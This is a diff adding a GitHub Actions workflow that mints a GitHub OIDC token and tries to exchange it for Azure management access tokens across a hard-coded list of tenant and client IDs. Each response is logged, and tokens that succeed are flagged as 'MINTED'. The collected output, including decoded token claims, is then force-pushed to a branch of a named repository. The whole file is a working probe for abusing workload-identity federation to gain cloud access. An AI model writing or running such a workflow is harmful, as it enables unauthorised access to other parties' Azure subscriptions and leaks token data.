@@ -1,0 +1,35 @@
+name: azoidc5
+on: workflow_dispatch
+permissions:
+  id-token: write
+  contents: write
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: mint-and-try
+        run: |
+          set +e
+          : > out.txt
+          TOKEN=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | python3 -c "import sys,json;print(json.load(sys.stdin).get('value',''))")
+          echo "oidc_len=${#TOKEN}" >> out.txt
+          echo "$TOKEN" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | head -c 700 >> out.txt
+          echo "" >> out.txt
+          for T in 38f221dc-0e2c-4a21-a905-54212e771231 e8adc959-bf67-48e0-95b4-318b5f73946c organizations common 0001746b-3028-43be-8d1a-9d398cdee9f9; do
+            for C in 2ac1b8af-6f93-4fa3-b65c-e629ad9c0bb6 d6529b06-857c-4e9e-81d0-eee83f0320ab 31f3b47b-3d31-4a5b-8f7e-1f3c8c0e7b35 25c1dc23-3925-49f1-94d3-4e702da5fa9b 621dcd44-3c72-4105-b862-301a105412af b9590f55-e173-495c-9010-15beb8611a43; do
+              R=$(curl -s -m 20 -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" -d grant_type=client_credentials -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer -d "client_id=$C" --data-urlencode "client_assertion=$TOKEN" -d "scope=https://management.azure.com/.default")
+              echo "TRY[$T|$C]=$(printf '%s' "$R" | head -c 240)" >> out.txt
+              printf '%s' "$R" | grep -q access_token && echo "MINTED[$T|$C]" >> out.txt
+            done
+          done
+          cat out.txt
+      - name: publish
+        run: |
+          git config user.email ul@x.local
+          git config user.name ul
+          git checkout -B azres-out5
+          cp out.txt azoidc5_result.txt
+          git add azoidc5_result.txt
+          git commit -m "azoidc5 result"
+          git push -f "https://x-access-token:${{ github.token }}@github.com/dongsuju/ul-plant.git" azres-out5
